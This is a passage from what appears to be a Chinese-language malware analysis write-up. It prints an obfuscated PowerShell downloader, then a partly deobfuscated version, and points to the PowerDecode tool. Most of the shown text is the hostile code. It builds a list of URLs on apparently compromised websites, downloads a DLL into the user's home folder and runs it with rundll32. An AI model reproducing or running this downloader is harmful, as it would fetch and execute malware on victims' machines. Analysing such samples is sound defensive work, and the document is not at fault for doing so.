class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;.p.p./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.c.5./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].&#x27;</span>.).+.<span class="hljs-string">&#x27;.e.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.1.r.[.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;././.r.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.v.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.a.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.b.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.h...c.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.o.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.m.p.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.c.o.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.q.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.t./.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.q.T./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.r.[.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.:././.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.o.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.r.e.y...&#x27;</span>.+.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.s.i.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.y.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.s./.w.p.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.-.c.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.t.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.t.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.u.W.&#x27;</span>.+.<span class="hljs-string">&#x27;./.@.].e.1.r.[.&#x27;</span>.).+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.s.:./.&#x27;</span>.+.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.u.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.e.o.p.t.&#x27;</span>.).+.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.i.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.p.e.&#x27;</span>.+.<span class="hljs-string">&#x27;...c.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.w.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.1.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.k.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.x.w.n./.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.s.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.E.&#x27;</span>.+.<span class="hljs-string">&#x27;.s./.&#x27;</span>.).)...<span class="hljs-string">&quot;.R.e.P.`.L.a.`.c.E.&quot;</span>.(.(.<span class="hljs-string">&#x27;.].&#x27;</span>.+.(.<span class="hljs-string">&#x27;.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.r.[.&#x27;</span>.).+.<span class="hljs-string">&#x27;.S.&#x27;</span>.).,.(.[<span class="hljs-type">.a.r.r.a.y.</span>].(.<span class="hljs-string">&#x27;.s.d.&#x27;</span>.,.<span class="hljs-string">&#x27;.s.w.&#x27;</span>.).,.(.<span class="hljs-string">&#x27;.h.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.p.&#x27;</span>.).,.<span class="hljs-string">&#x27;.3.d.&#x27;</span>.).[<span class="hljs-type">.1.</span>].)...<span class="hljs-string">&quot;.S.p.L.`.i.t.&quot;</span>.(.<span class="hljs-variable">$</span>.R.<span class="hljs-number">7.1</span>.P. .+. .<span class="hljs-variable">$</span>.U.<span class="hljs-number">1</span>.u.h.<span class="hljs-number">7.4</span>.<span class="hljs-number">8</span>. .+. .<span class="hljs-variable">$</span>.X.<span class="hljs-number">4.9</span>.R.).;.<span class="hljs-variable">$</span>.I.<span class="hljs-number">1.4</span>.G.=.(.<span class="hljs-string">&#x27;.W.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.9.&#x27;</span>.+.<span class="hljs-string">&#x27;.4.G.&#x27;</span>.).).;.f.o.r.e.a.c.h. .(.<span class="hljs-variable">$</span>.Q.x.<span class="hljs-number">5.5</span>.i.z.<span class="hljs-number">5</span>. .i.n. .<span class="hljs-variable">$</span>.M.l.<span class="hljs-number">3</span>.e.v.q.l.).&#123;.t.r.y.&#123;.(...(.<span class="hljs-string">&#x27;.N.e.w.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.O.b.j.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.c.t.&#x27;</span>.). .s.y.S.t.E.m...n.e.T...W.E.B.c.l.i.E.n.t.)...<span class="hljs-string">&quot;.d.`.O.`.w.n.L.o.`.A.D.f.I.l.E.&quot;</span>.(.<span class="hljs-variable">$</span>.Q.x.<span class="hljs-number">5.5</span>.i.z.<span class="hljs-number">5</span>.,. .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.).;.<span class="hljs-variable">$</span>.G.<span class="hljs-number">5.0</span>.C.=.(.<span class="hljs-string">&#x27;.U.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.7.&#x27;</span>.+.<span class="hljs-string">&#x27;.W.&#x27;</span>.).).;.I.f. .(.(.&amp;.(.<span class="hljs-string">&#x27;.G.e.t.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.I.t.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.&#x27;</span>.). .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.)...<span class="hljs-string">&quot;.L.E.N.`.G.t.h.&quot;</span>. .-.g.e. .<span class="hljs-number">3.1</span>.<span class="hljs-number">9.6</span>.<span class="hljs-number">3</span>.). .&#123;.&amp;.(.<span class="hljs-string">&#x27;.r.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.n.d.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.l.3.2.&#x27;</span>.). .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.,.(.(.<span class="hljs-string">&#x27;.C.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.n.t.r.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.1._.R.u.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.D.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.)...<span class="hljs-string">&quot;.t.`.O.s.`.T.r.I.N.G.&quot;</span>.(.).;.<span class="hljs-variable">$</span>.H.<span class="hljs-number">3.7</span>.C.=.(.<span class="hljs-string">&#x27;.H.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.J.&#x27;</span>.).).;.b.r.e.a.k.;.<span class="hljs-variable">$</span>.K.<span class="hljs-number">4</span>._.Q.=.(.<span class="hljs-string">&#x27;.M.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.6.Q.&#x27;</span>.).&#125;.&#125;.c.a.t.c.h.&#123;.&#125;.&#125;.<span class="hljs-variable">$</span>.B.<span class="hljs-number">7.2</span>.H.=.(.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;._._.&#x27;</span>.+.<span class="hljs-string">&#x27;.X.&#x27;</span>.).).<br></code></pre></td></tr></table></figure><p>手动处理一下一些混淆, 删除”.”，得到</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sEt</span> (<span class="hljs-string">&quot;Zy3&quot;</span>+<span class="hljs-string">&quot;5&quot;</span>) ([<span class="hljs-type">TyPe</span>](<span class="hljs-string">&quot;&#123;2&#125;&#123;5&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&#x27;IReC&#x27;</span>,<span class="hljs-string">&#x27;To&#x27;</span>,<span class="hljs-string">&#x27;SyStEM&#x27;</span>,<span class="hljs-string">&#x27;RY&#x27;</span>,<span class="hljs-string">&#x27;OD&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>) );<br><span class="hljs-built_in">Set-ITEM</span> variABle:YJu4z3 ([<span class="hljs-type">Type</span>](<span class="hljs-string">&quot;&#123;4&#125;&#123;5&#125;&#123;3&#125;&#123;6&#125;&#123;1&#125;&#123;7&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="hljs-operator">-f</span><span class="hljs-string">&#x27;ce&#x27;</span>,<span class="hljs-string">&#x27;eTSeRV&#x27;</span>,<span class="hljs-string">&#x27;pOinTMANAgEr&#x27;</span>,<span class="hljs-string">&#x27;Stem&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>)  );<br><span class="hljs-variable">$ErrorActionPreference</span> = ((<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;ile&#x27;</span>)+<span class="hljs-string">&#x27;n&#x27;</span>+(<span class="hljs-string">&#x27;tl&#x27;</span>+<span class="hljs-string">&#x27;yCo&#x27;</span>)+<span class="hljs-string">&#x27;n&#x27;</span>+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;inue&#x27;</span>));<br><span class="hljs-variable">$U1uh748</span>=<span class="hljs-variable">$E34H</span> + [<span class="hljs-built_in">char</span>](<span class="hljs-number">64</span>) + <span class="hljs-variable">$G35Q</span>;<br><span class="hljs-variable">$B62Q</span>=((<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;03&#x27;</span>)+<span class="hljs-string">&#x27;K&#x27;</span>);<br> (  <span class="hljs-built_in">dir</span>  (<span class="hljs-string">&#x27;VArI&#x27;</span>+<span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-string">&#x27;BL&#x27;</span>+<span class="hljs-string">&#x27;e:zy35&#x27;</span>))<br>vaLUE::<span class="hljs-string">&quot;C`ReA`Ted`IrEcToRy&quot;</span> (<span class="hljs-variable">$HOME</span> + (((<span class="hljs-string">&#x27;XE8Z&#x27;</span>+<span class="hljs-string">&#x27;3t&#x27;</span>)+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5dXE8L&#x27;</span>)+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;z3&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;3X&#x27;</span>)+<span class="hljs-string">&#x27;E8&#x27;</span>)<span class="hljs-operator">-RePLACe</span> ([<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">88</span>+[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">69</span>+[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">56</span>),[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">92</span>));<br><span class="hljs-variable">$M95A</span>=(<span class="hljs-string">&#x27;F7&#x27;</span>+<span class="hljs-string">&#x27;0N&#x27;</span>);<br>(<span class="hljs-built_in">Ls</span>  VAriABle:YJU4Z3)vaLuE::<span class="hljs-string">&quot;se`Cur`i`TYp`RotOCoL&quot;</span> = ((<span class="hljs-string">&#x27;Tls&#x27;</span>+<span class="hljs-string">&#x27;1&#x27;</span>)+<span class="hljs-string">&#x27;2&#x27;</span>);<br><span class="hljs-variable">$L5_C</span>=(<span class="hljs-string">&#x27;P6&#x27;</span>+<span class="hljs-string">&#x27;7K&#x27;</span>);<br><span class="hljs-variable">$Vlzczi0</span> = (<span class="hljs-string">&#x27;O2&#x27;</span>+<span class="hljs-string">&#x27;8C&#x27;</span>);<br><span class="hljs-variable">$P40O</span>=(<span class="hljs-string">&#x27;W&#x27;</span>+(<span class="hljs-string">&#x27;3&#x27;</span>+<span class="hljs-string">&#x27;1C&#x27;</span>));<br><span class="hljs-variable">$F4mnqaf</span>=<span class="hljs-variable">$HOME</span>+((<span class="hljs-string">&#x27;&#123;0&#125;Z3t&#x27;</span>+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5d&#x27;</span>)+<span class="hljs-string">&#x27;&#123;0&#125;L6z3&#x27;</span>+<span class="hljs-string">&#x27;oo3&#123;0&#x27;</span>+<span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-operator">-f</span>[<span class="hljs-built_in">cHar</span>]<span class="hljs-number">92</span>)+<span class="hljs-variable">$Vlzczi0</span>+(<span class="hljs-string">&#x27;&#x27;</span>+(<span class="hljs-string">&#x27;dl&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>));<br><span class="hljs-variable">$J04B</span>=(<span class="hljs-string">&#x27;Q&#x27;</span>+(<span class="hljs-string">&#x27;40&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>));<br><span class="hljs-variable">$Ml3evql</span>=(<span class="hljs-string">&#x27;]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;://an&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;vatco&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>)+(<span class="hljs-string">&#x27;sp-&#x27;</span>+<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;dmin/fw&#x27;</span>)+<span class="hljs-string">&#x27;/&#x27;</span>+(<span class="hljs-string">&#x27;@]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>)+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>+(<span class="hljs-string">&#x27;/git&#x27;</span>+<span class="hljs-string">&#x27;th&#x27;</span>+<span class="hljs-string">&#x27;e&#x27;</span>)+(<span class="hljs-string">&#x27;ind&#x27;</span>+<span class="hljs-string">&#x27;ka&#x27;</span>)+(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;ire&#x27;</span>)+<span class="hljs-string">&#x27;ct&#x27;</span>+(<span class="hljs-string">&#x27;orlc&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/2&#x27;</span>+<span class="hljs-string">&#x27;/q&#x27;</span>+(<span class="hljs-string">&#x27;OY&#x27;</span>+<span class="hljs-string">&#x27;w&#x27;</span>)+<span class="hljs-string">&#x27;T&#x27;</span>+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>)+(<span class="hljs-string">&#x27;/elog&#x27;</span>+<span class="hljs-string">&#x27;sg&#x27;</span>)+(<span class="hljs-string">&#x27;4&#x27;</span>+<span class="hljs-string">&#x27;gtechn&#x27;</span>+<span class="hljs-string">&#x27;tlogie&#x27;</span>)+<span class="hljs-string">&#x27;s&#x27;</span>+(<span class="hljs-string">&#x27;com/b&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>)+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;us/v&#x27;</span>)+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r&#x27;</span>)+(<span class="hljs-string">&#x27;[S://&#x27;</span>+<span class="hljs-string">&#x27;pa&#x27;</span>+<span class="hljs-string">&#x27;tta&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>+<span class="hljs-string">&#x27;istooe&#x27;</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/vi&#x27;</span>)+(<span class="hljs-string">&#x27;pio-&#x27;</span>+<span class="hljs-string">&#x27;z&#x27;</span>)+(<span class="hljs-string">&#x27;etw&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+(<span class="hljs-string">&#x27;xk-1&#x27;</span>+<span class="hljs-string">&#x27;h&#x27;</span>)+(<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;pp/&#x27;</span>)+(<span class="hljs-string">&#x27;c5/@&#x27;</span>+<span class="hljs-string">&#x27;]&#x27;</span>)+<span class="hljs-string">&#x27;e&#x27;</span>+(<span class="hljs-string">&#x27;1r[S&#x27;</span>+<span class="hljs-string">&#x27;:&#x27;</span>)+(<span class="hljs-string">&#x27;//rs&#x27;</span>+<span class="hljs-string">&#x27;v&#x27;</span>)+<span class="hljs-string">&#x27;ma&#x27;</span>+(<span class="hljs-string">&#x27;b&#x27;</span>+<span class="hljs-string">&#x27;in&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;hc&#x27;</span>)+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/mp&#x27;</span>+<span class="hljs-string">&#x27;-con&#x27;</span>)+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;qn&#x27;</span>)+(<span class="hljs-string">&#x27;t/1&#x27;</span>+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;qT/@&#x27;</span>+<span class="hljs-string">&#x27;]e1&#x27;</span>)+(<span class="hljs-string">&#x27;r[S&#x27;</span>+<span class="hljs-string">&#x27;s://&#x27;</span>+<span class="hljs-string">&#x27;ee&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;mo&#x27;</span>)+(<span class="hljs-string">&#x27;rey&#x27;</span>+<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;usin&#x27;</span>)+(<span class="hljs-string">&#x27;ys&#x27;</span>+<span class="hljs-string">&#x27;s/wp&#x27;</span>)+(<span class="hljs-string">&#x27;-co&#x27;</span>+<span class="hljs-string">&#x27;nte&#x27;</span>+<span class="hljs-string">&#x27;nt&#x27;</span>)+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;nuW&#x27;</span>+<span class="hljs-string">&#x27;/@]e1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;s:/&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;su&#x27;</span>+<span class="hljs-string">&#x27;ieopt&#x27;</span>)+<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;mi&#x27;</span>+(<span class="hljs-string">&#x27;pe&#x27;</span>+<span class="hljs-string">&#x27;co&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;we&#x27;</span>)+(<span class="hljs-string">&#x27;11&#x27;</span>+<span class="hljs-string">&#x27;-&#x27;</span>)+(<span class="hljs-string">&#x27;kn&#x27;</span>+<span class="hljs-string">&#x27;xwn/&#x27;</span>+<span class="hljs-string">&#x27;Ss&#x27;</span>)+(<span class="hljs-string">&#x27;E&#x27;</span>+<span class="hljs-string">&#x27;s/&#x27;</span>)).replace((<span class="hljs-string">&#x27;]&#x27;</span>+(<span class="hljs-string">&#x27;e&#x27;</span>+<span class="hljs-string">&#x27;1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>),([<span class="hljs-built_in">array</span>](<span class="hljs-string">&#x27;sd&#x27;</span>,<span class="hljs-string">&#x27;sw&#x27;</span>),(<span class="hljs-string">&#x27;ht&#x27;</span>+<span class="hljs-string">&#x27;tp&#x27;</span>),<span class="hljs-string">&#x27;3d&#x27;</span>)[<span class="hljs-number">1</span>]).SpLit(<span class="hljs-variable">$R71P</span> + <span class="hljs-variable">$U1uh748</span> + <span class="hljs-variable">$X49R</span>);<br><span class="hljs-variable">$I14G</span>=(<span class="hljs-string">&#x27;W&#x27;</span>+(<span class="hljs-string">&#x27;9&#x27;</span>+<span class="hljs-string">&#x27;4G&#x27;</span>));<br><br><span class="hljs-built_in">write-host</span> <span class="hljs-variable">$Ml3evql</span><br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Qx55iz5</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ml3evql</span>) &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        ((<span class="hljs-string">&#x27;New&#x27;</span>+<span class="hljs-string">&#x27;-Obj&#x27;</span>+<span class="hljs-string">&#x27;ect&#x27;</span>) syStEmneTWEBcliEnt)<span class="hljs-string">&quot;d`O`wnLo`ADfIlE&quot;</span>(<span class="hljs-variable">$Qx55iz5</span>, <span class="hljs-variable">$F4mnqaf</span>);<br>        <span class="hljs-variable">$G50C</span>=(<span class="hljs-string">&#x27;U&#x27;</span>+(<span class="hljs-string">&#x27;37&#x27;</span>+<span class="hljs-string">&#x27;W&#x27;</span>));<br>        <span class="hljs-keyword">If</span> ((&amp;(<span class="hljs-string">&#x27;Get-&#x27;</span>+<span class="hljs-string">&#x27;Ite&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>) <span class="hljs-variable">$F4mnqaf</span>)<span class="hljs-string">&quot;LEN`Gth&quot;</span> <span class="hljs-operator">-ge</span> <span class="hljs-number">31963</span>) &#123;&amp;(<span class="hljs-string">&#x27;r&#x27;</span>+<span class="hljs-string">&#x27;undl&#x27;</span>+<span class="hljs-string">&#x27;l32&#x27;</span>) <span class="hljs-variable">$F4mnqaf</span>,((<span class="hljs-string">&#x27;C&#x27;</span>+<span class="hljs-string">&#x27;ontro&#x27;</span>+<span class="hljs-string">&#x27;1_Ru&#x27;</span>)+<span class="hljs-string">&#x27;nD&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>).tOsTrING();<br>        <span class="hljs-variable">$H37C</span>=(<span class="hljs-string">&#x27;H&#x27;</span>+(<span class="hljs-string">&#x27;30&#x27;</span>+<span class="hljs-string">&#x27;J&#x27;</span>));<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-variable">$K4_Q</span>=(<span class="hljs-string">&#x27;M1&#x27;</span>+<span class="hljs-string">&#x27;6Q&#x27;</span>)&#125;<br>    &#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br><span class="hljs-variable">$B72H</span>=(<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;__&#x27;</span>+<span class="hljs-string">&#x27;X&#x27;</span>))<br></code></pre></td></tr></table></figure><p>powerdecode进行调试</p><p><a href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> <span class="hljs-variable">$Ml3evql</span>=(<span class="hljs-string">&#x27;]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;://an&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;vatco&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>)+(<span class="hljs-string">&#x27;sp-&#x27;</span>+<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;dmin/fw&#x27;</span>)+<span class="hljs-string">&#x27;/&#x27;</span>+(<span class="hljs-string">&#x27;@]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>)+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>+(<span class="hljs-string">&#x27;/git&#x27;</span>+<span class="hljs-string">&#x27;th&#x27;</span>+<span class="hljs-string">&#x27;e&#x27;</span>)+(<span class="hljs-string">&#x27;ind&#x27;</span>+<span class="hljs-string">&#x27;ka&#x27;</span>)+(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;ire&#x27;</span>)+<span class="hljs-string">&#x27;ct&#x27;</span>+(<span class="hljs-string">&#x27;orlc&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/2&#x27;</span>+<span class="hljs-string">&#x27;/q&#x27;</span>+(<span class="hljs-string">&#x27;OY&#x27;</span>+<span class="hljs-string">&#x27;w&#x27;</span>)+<span class="hljs-string">&#x27;T&#x27;</span>+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>)+(<span class="hljs-string">&#x27;/elog&#x27;</span>+<span class="hljs-string">&#x27;sg&#x27;</span>)+(<span class="hljs-string">&#x27;4&#x27;</span>+<span class="hljs-string">&#x27;gtechn&#x27;</span>+<span class="hljs-string">&#x27;tlogie&#x27;</span>)+<span class="hljs-string">&#x27;s&#x27;</span>+(<span class="hljs-string">&#x27;com/b&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>)+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;us/v&#x27;</span>)+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r&#x27;</span>)+(<span class="hljs-string">&#x27;[S://&#x27;</span>+<span class="hljs-string">&#x27;pa&#x27;</span>+<span class="hljs-string">&#x27;tta&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>+<span class="hljs-string">&#x27;istooe&#x27;</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/vi&#x27;</span>)+(<span class="hljs-string">&#x27;pio-&#x27;</span>+<span class="hljs-string">&#x27;z&#x27;</span>)+(<span class="hljs-string">&#x27;etw&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+(<span class="hljs-string">&#x27;xk-1&#x27;</span>+<span class="hljs-string">&#x27;h&#x27;</span>)+(<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;pp/&#x27;</span>)+(<span class="hljs-string">&#x27;c5/@&#x27;</span>+<span class="hljs-string">&#x27;]&#x27;</span>)+<span class="hljs-string">&#x27;e&#x27;</span>+(<span class="hljs-string">&#x27;1r[S&#x27;</span>+<span class="hljs-string">&#x27;:&#x27;</span>)+(<span class="hljs-string">&#x27;//rs&#x27;</span>+<span class="hljs-string">&#x27;v&#x27;</span>)+<span class="hljs-string">&#x27;ma&#x27;</span>+(<span class="hljs-string">&#x27;b&#x27;</span>+<span class="hljs-string">&#x27;in&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;hc&#x27;</span>)+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/mp&#x27;</span>+<span class="hljs-string">&#x27;-con&#x27;</span>)+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;qn&#x27;</span>)+(<span class="hljs-string">&#x27;t/1&#x27;</span>+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;qT/@&#x27;</span>+<span class="hljs-string">&#x27;]e1&#x27;</span>)+(<span class="hljs-string">&#x27;r[S&#x27;</span>+<span class="hljs-string">&#x27;s://&#x27;</span>+<span class="hljs-string">&#x27;ee&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;mo&#x27;</span>)+(<span 